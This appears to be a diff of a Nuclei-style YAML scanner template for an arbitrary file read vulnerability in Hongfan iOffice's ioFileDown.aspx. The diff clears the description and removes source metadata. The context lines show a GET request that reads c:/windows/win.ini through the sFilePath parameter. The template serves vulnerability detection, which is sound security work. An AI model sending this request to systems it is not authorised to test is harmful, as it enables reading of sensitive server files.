@@ -3,12 +3,8 @@ info:
   name: 红帆 iOffice ioFileDown任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cobayxbuvlr9pwpl'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cobayxbuvlr9pwpl
-    fofa: 暂无
 http:
 - raw:
   - 'GET /ioffice/prg/interface/ioFileDown.aspx?sFilePath=c:/windows/win.ini HTTP/1.1
